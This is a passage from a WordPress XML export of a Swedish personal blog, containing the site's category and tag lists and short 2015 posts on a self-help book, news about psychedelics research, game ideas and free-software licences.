<?xml version="1.0" encoding="UTF-8" ?>
<!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your site. -->
<!-- It contains information about your site's posts, pages, comments, categories, and other content. -->
<!-- You may use this file to transfer that content from one site to another. -->
<!-- This file is not intended to serve as a complete backup of your site. -->

<!-- To import this information into a WordPress site follow these steps: -->
<!-- 1. Log in to that site as an administrator. -->
<!-- 2. Go to Tools: Import in the WordPress admin panel. -->
<!-- 3. Install the "WordPress" importer from the list. -->
<!-- 4. Activate & Run Importer. -->
<!-- 5. Upload this file using the form provided on that page. -->
<!-- 6. You will first be asked to map the authors in this export file to users -->
<!--    on the site. For each author, you may choose to map to an -->
<!--    existing user on the site or to create a new user. -->
<!-- 7. WordPress will then import each of the posts, pages, comments, categories, etc. -->
<!--    contained in this file into your site. -->

<!-- generator="WordPress.com" created="2016-08-01 23:21"-->
<rss version="2.0"
	xmlns:excerpt="http://wordpress.org/export/1.2/excerpt/"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:wp="http://wordpress.org/export/1.2/"
>

<channel>
	<title>stuffidontwanttogoogleagain</title>
	<link>https://stuffidontwanttogoogleagain.wordpress.com</link>
	<description>The googeling is too damn high!</description>
	<pubDate>Mon, 01 Aug 2016 23:21:18 +0000</pubDate>
	<language></language>
	<wp:wxr_version>1.2</wp:wxr_version>
	<wp:base_site_url>http://wordpress.com/</wp:base_site_url>
	<wp:base_blog_url>https://stuffidontwanttogoogleagain.wordpress.com</wp:base_blog_url>

	<wp:author><wp:author_id>1959580</wp:author_id><wp:author_login><![CDATA[tidlost]]></wp:author_login><wp:author_email><![CDATA[tl.dr.mfw@gmail.com]]></wp:author_email><wp:author_display_name><![CDATA[tidlost]]></wp:author_display_name><wp:author_first_name><![CDATA[]]></wp:author_first_name><wp:author_last_name><![CDATA[]]></wp:author_last_name></wp:author>

	<wp:category><wp:term_id>1560</wp:term_id><wp:category_nicename>allmant</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[allmänt]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>254552072</wp:term_id><wp:category_nicename>appide</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[appidé]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>32904262</wp:term_id><wp:category_nicename>artikelide</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[artikelidé]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>5469</wp:term_id><wp:category_nicename>backup</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[backup]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>29718</wp:term_id><wp:category_nicename>bocker</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[böcker]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>114042</wp:term_id><wp:category_nicename>bootstrap</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[bootstrap]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>43080522</wp:term_id><wp:category_nicename>cloudflare</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[cloudflare]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>169</wp:term_id><wp:category_nicename>css</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[css]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>154515</wp:term_id><wp:category_nicename>engelska</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[engelska]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>524</wp:term_id><wp:category_nicename>film</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[film]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>5429</wp:term_id><wp:category_nicename>flex</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[flex]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>209196</wp:term_id><wp:category_nicename>git</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[git]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>2708</wp:term_id><wp:category_nicename>how-to</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[how-to]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>647</wp:term_id><wp:category_nicename>html</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[html]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>53242</wp:term_id><wp:category_nicename>html5</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[html5]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>270971</wp:term_id><wp:category_nicename>integritet</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[integritet]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>457</wp:term_id><wp:category_nicename>javascript</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[javascript]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>203308</wp:term_id><wp:category_nicename>jquery</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[jQuery]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>8431750</wp:term_id><wp:category_nicename>jquery-ui</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[jQuery UI]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>141794</wp:term_id><wp:category_nicename>matlagning</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[matlagning]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>3122</wp:term_id><wp:category_nicename>musik</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[musik]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>1407192</wp:term_id><wp:category_nicename>optimering</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[optimering]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>17570</wp:term_id><wp:category_nicename>recept</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[recept]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>355842130</wp:term_id><wp:category_nicename>robotkommunism</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[robotkommunism]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>2340724</wp:term_id><wp:category_nicename>screen-reader</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[screen-reader]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>1958</wp:term_id><wp:category_nicename>seo</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[SEO]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>90251</wp:term_id><wp:category_nicename>spanska</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[spanska]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>6050</wp:term_id><wp:category_nicename>teknik</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[teknik]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>698509</wp:term_id><wp:category_nicename>tidskrift</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[tidskrift]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>1</wp:term_id><wp:category_nicename>uncategorized</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[Uncategorized]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>95662102</wp:term_id><wp:category_nicename>web-utveckling</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[web-utveckling]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>41033</wp:term_id><wp:category_nicename>webbdesign</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[webbdesign]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>20636</wp:term_id><wp:category_nicename>wordpres</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[wordpres]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>33</wp:term_id><wp:category_nicename>wordpress</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[wordpress]]></wp:cat_name></wp:category>
	<wp:tag><wp:term_id>21052</wp:term_id><wp:tag_slug>aids</wp:tag_slug><wp:tag_name><![CDATA[aids]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>1338660</wp:term_id><wp:tag_slug>algoritm</wp:tag_slug><wp:tag_name><![CDATA[algoritm]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>254552072</wp:term_id><wp:tag_slug>appide</wp:tag_slug><wp:tag_name><![CDATA[appidé]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>144771</wp:term_id><wp:tag_slug>apt</wp:tag_slug><wp:tag_name><![CDATA[apt]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>24084</wp:term_id><wp:tag_slug>artikel</wp:tag_slug><wp:tag_name><![CDATA[artikel]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>566229</wp:term_id><wp:tag_slug>ayahuasca</wp:tag_slug><wp:tag_name><![CDATA[ayahuasca]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>25842659</wp:term_id><wp:tag_slug>binart</wp:tag_slug><wp:tag_name><![CDATA[binärt]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>98801</wp:term_id><wp:tag_slug>bok</wp:tag_slug><wp:tag_name><![CDATA[bok]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>14667289</wp:term_id><wp:tag_slug>burp-suite</wp:tag_slug><wp:tag_name><![CDATA[burp suite]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>70199</wp:term_id><wp:tag_slug>byrakrati</wp:tag_slug><wp:tag_name><![CDATA[byråkrati]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>2426</wp:term_id><wp:tag_slug>c</wp:tag_slug><wp:tag_name><![CDATA[c]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>132483838</wp:term_id><wp:tag_slug>child-tema</wp:tag_slug><wp:tag_name><![CDATA[child-tema]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>169</wp:term_id><wp:tag_slug>css</wp:tag_slug><wp:tag_name><![CDATA[css]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>663591</wp:term_id><wp:tag_slug>ctf</wp:tag_slug><wp:tag_name><![CDATA[CTF]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>220114</wp:term_id><wp:tag_slug>ctr</wp:tag_slug><wp:tag_name><![CDATA[CTR]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>346753643</wp:term_id><wp:tag_slug>datormaskin</wp:tag_slug><wp:tag_name><![CDATA[datormaskin]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>11869</wp:term_id><wp:tag_slug>error</wp:tag_slug><wp:tag_name><![CDATA[error]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>292717</wp:term_id><wp:tag_slug>estetik</wp:tag_slug><wp:tag_name><![CDATA[estetik]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>1652214</wp:term_id><wp:tag_slug>fornedring</wp:tag_slug><wp:tag_name><![CDATA[förnedring]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>524</wp:term_id><wp:tag_slug>film</wp:tag_slug><wp:tag_name><![CDATA[film]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>10522</wp:term_id><wp:tag_slug>ftp</wp:tag_slug><wp:tag_name><![CDATA[ftp]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>209196</wp:term_id><wp:tag_slug>git</wp:tag_slug><wp:tag_name><![CDATA[git]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>36437040</wp:term_id><wp:tag_slug>google-font</wp:tag_slug><wp:tag_name><![CDATA[google font]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>73765</wp:term_id><wp:tag_slug>hiv</wp:tag_slug><wp:tag_name><![CDATA[hiv]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>2708</wp:term_id><wp:tag_slug>how-to</wp:tag_slug><wp:tag_name><![CDATA[how-to]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>647</wp:term_id><wp:tag_slug>html</wp:tag_slug><wp:tag_name><![CDATA[html]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>578508</wp:term_id><wp:tag_slug>hydra</wp:tag_slug><wp:tag_name><![CDATA[hydra]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>7746</wp:term_id><wp:tag_slug>ide</wp:tag_slug><wp:tag_name><![CDATA[idé]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>53860</wp:term_id><wp:tag_slug>kommunikation</wp:tag_slug><wp:tag_name><![CDATA[kommunikation]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>20018</wp:term_id><wp:tag_slug>konst</wp:tag_slug><wp:tag_name><![CDATA[konst]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>94519</wp:term_id><wp:tag_slug>kuriosa</wp:tag_slug><wp:tag_name><![CDATA[kuriosa]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>610</wp:term_id><wp:tag_slug>linux</wp:tag_slug><wp:tag_name><![CDATA[linux]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>141794</wp:term_id><wp:tag_slug>matlagning</wp:tag_slug><wp:tag_name><![CDATA[matlagning]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>101876</wp:term_id><wp:tag_slug>medvetande</wp:tag_slug><wp:tag_name><![CDATA[medvetande]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>92025522</wp:term_id><wp:tag_slug>meny-rad</wp:tag_slug><wp:tag_name><![CDATA[meny-rad]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>21954763</wp:term_id><wp:tag_slug>mongodb</wp:tag_slug><wp:tag_name><![CDATA[mongodb]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>406074</wp:term_id><wp:tag_slug>nmap</wp:tag_slug><wp:tag_name><![CDATA[nmap]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>962177</wp:term_id><wp:tag_slug>npm</wp:tag_slug><wp:tag_name><![CDATA[npm]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>89032</wp:term_id><wp:tag_slug>nytimes</wp:tag_slug><wp:tag_name><![CDATA[nytimes]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>910716</wp:term_id><wp:tag_slug>pen-testing</wp:tag_slug><wp:tag_name><![CDATA[pen-testing]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>18655</wp:term_id><wp:tag_slug>pizza</wp:tag_slug><wp:tag_name><![CDATA[pizza]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>196</wp:term_id><wp:tag_slug>programming</wp:tag_slug><wp:tag_name><![CDATA[programming]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>61208</wp:term_id><wp:tag_slug>psilocybin</wp:tag_slug><wp:tag_name><![CDATA[psilocybin]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>17570</wp:term_id><wp:tag_slug>recept</wp:tag_slug><wp:tag_name><![CDATA[recept]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>70705299</wp:term_id><wp:tag_slug>renassansmanniska</wp:tag_slug><wp:tag_name><![CDATA[renässansmänniska]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>455</wp:term_id><wp:tag_slug>script</wp:tag_slug><wp:tag_name><![CDATA[script]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>801</wp:term_id><wp:tag_slug>security</wp:tag_slug><wp:tag_name><![CDATA[security]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>238672</wp:term_id><wp:tag_slug>solution</wp:tag_slug><wp:tag_name><![CDATA[solution]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>11496</wp:term_id><wp:tag_slug>spel</wp:tag_slug><wp:tag_name><![CDATA[spel]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>1981</wp:term_id><wp:tag_slug>tools</wp:tag_slug><wp:tag_name><![CDATA[tools]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>255</wp:term_id><wp:tag_slug>ubuntu</wp:tag_slug><wp:tag_name><![CDATA[ubuntu]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>802295</wp:term_id><wp:tag_slug>utdrag</wp:tag_slug><wp:tag_name><![CDATA[utdrag]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>89722</wp:term_id><wp:tag_slug>vanstern</wp:tag_slug><wp:tag_name><![CDATA[vänstern]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>18060</wp:term_id><wp:tag_slug>vim</wp:tag_slug><wp:tag_name><![CDATA[vim]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>248032408</wp:term_id><wp:tag_slug>vulnhub</wp:tag_slug><wp:tag_name><![CDATA[vulnhub]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>64947</wp:term_id><wp:tag_slug>wargames</wp:tag_slug><wp:tag_name><![CDATA[wargames]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>33</wp:term_id><wp:tag_slug>wordpress</wp:tag_slug><wp:tag_name><![CDATA[wordpress]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>220411</wp:term_id><wp:tag_slug>work-flow</wp:tag_slug><wp:tag_name><![CDATA[work-flow]]></wp:tag_name></wp:tag>

	<generator>http://wordpress.com/</generator>
<image>
		<url>http://s2.wp.com/i/buttonw-com.png</url>
		<title>stuffidontwanttogoogleagain</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com</link>
	</image>
		
	<item>
		<title>The Power of Habit</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/03/28/the-power-of-habit/</link>
		<pubDate>Sat, 28 Mar 2015 17:01:05 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=28</guid>
		<description></description>
		<content:encoded><![CDATA[Har läst boken <strong>The Power of Habit</strong> av Charles Duhigg. Känns som att boken kan placeras i samma kategori som Malcolm Gladwell-böcker. Populärvetenskap blandat med många anekdoter. Det är helt klart en underhållande stil. Men samtidigt angränsar den till självhjälps-litteraturen, vilken såklart får en att ifrågasätta vad man egentligen läser. Amerikanerna är skickliga på att få normala berättelser att framstå som helt ofattbara. Jag ska i alla fall se om jag kan ta till mig några av huvuddragen i boken och testa på dom i livet.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>28</wp:post_id>
		<wp:post_date>2015-03-28 17:01:05</wp:post_date>
		<wp:post_date_gmt>2015-03-28 17:01:05</wp:post_date_gmt>
		<wp:comment_status>closed</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>the-power-of-habit</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="bok"><![CDATA[bok]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>geo_public</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[28]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[28]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Ayahusca och psilocybin</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/03/28/ayahusca-och-psilocybin/</link>
		<pubDate>Sat, 28 Mar 2015 20:59:18 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=30</guid>
		<description></description>
		<content:encoded><![CDATA[Av en slump har jag inom kort tid läst tre artklar om psilocybin och ayahuasca i olika medier. Dels Lars Sjöstrands artikel om Aldous Huxley i <a href="http://läkartidningen.se/Aktuellt/Kultur/Kultur/2015/03/Nyfikenhet-utan-granser/">läkartidningen</a>, å en längre artikel i <a href="http://www.newyorker.com/magazine/2015/02/09/trip-treatment">The New Yorker</a> om Timothy Leary och användandet av psilocibyn för att hantera människans rädsla för döden. Och idag skrev The New York Times of användandet av ayahuasca för att hjälpa brasilianska <a href="http://www.nytimes.com/2015/03/29/world/americas/a-hallucinogenic-tea-time-for-some-brazilian-prisoners.html">fångar</a>. Den svenska filmen <a href="http://www.imdb.com/title/tt2835536/?ref_=nm_knf_i1">The Quiet Roar</a> behandlar även temat. Men den filmen har jag fortfarande inte sett. Kanske börjar svampar och ayahuasca röra sig från hippiekulturen mot medicinen.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>30</wp:post_id>
		<wp:post_date>2015-03-28 20:59:18</wp:post_date>
		<wp:post_date_gmt>2015-03-28 20:59:18</wp:post_date_gmt>
		<wp:comment_status>closed</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ayahusca-och-psilocybin</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="ayahuasca"><![CDATA[ayahuasca]]></category>
		<category domain="post_tag" nicename="medvetande"><![CDATA[medvetande]]></category>
		<category domain="post_tag" nicename="psilocybin"><![CDATA[psilocybin]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[30]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[30]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Ett udda spel</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/03/28/ett-udda-spel/</link>
		<pubDate>Sat, 28 Mar 2015 21:47:56 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=32</guid>
		<description></description>
		<content:encoded><![CDATA[Hur skulle ett datorspel kunna se ut där man inte kunde var karaktärer i den traditionell meningen. Istället för att vara människa, djur, monster, fantasifigur, så är man vind, känslor, jord, vakuum. Det skulle kunna bli ett helt flippat spel. Att välja vänskap, hat, tråkighet, intighet, rymd, vind som spelkaraktär.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>32</wp:post_id>
		<wp:post_date>2015-03-28 21:47:56</wp:post_date>
		<wp:post_date_gmt>2015-03-28 21:47:56</wp:post_date_gmt>
		<wp:comment_status>closed</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ett-udda-spel</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="spel"><![CDATA[spel]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[32]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[32]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Fri mjukvara</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/03/29/fri-mjukvara/</link>
		<pubDate>Sun, 29 Mar 2015 01:50:53 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=35</guid>
		<description></description>
		<content:encoded><![CDATA[GPL, BSD, Copyleft, Kopimi, CC, CC-NC, Floss, Foss, Open Source, PPL. Flanker, skyttergravar, ideologi. Mycket skiljer alla dom här koncepten åt.

Peer Production License är kanske det mest intressanta av alla dessa. PPL är designat och föreslagit av Kleiner.

Den <a href="https://vimeo.com/18504379">här</a> föreläsningen av <a href="http://adamobeng.com/me.html">Adam</a> <a href="https://twitter.com/Adam_Obeng">Obeng</a> kan vara givande.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>35</wp:post_id>
		<wp:post_date>2015-03-29 01:50:53</wp:post_date>
		<wp:post_date_gmt>2015-03-29 01:50:53</wp:post_date_gmt>
		<wp:comment_status>closed</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>fri-mjukvara</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[35]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[35]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Spel-idé</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/03/29/hemside-ide/</link>
		<pubDate>Sun, 29 Mar 2015 14:29:05 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=37</guid>
		<description></description>
		<content:encoded><![CDATA[Göra ett spel som bygger på visuell inlärning. Det är uppbyggt som ett quiz. För varje konstverk ska spelaren identifiera konstnären. Poängen med spelet ska inte vara att man memorerar alla konstnärens konstverk, utan att man istället lär sig varje konstnärs stil, vilket gör att man i framtiden ska kunna känna igen konstverk från en konstnär som man inte tidigare sett. Man får alltså en känsla för verket, en intuition.

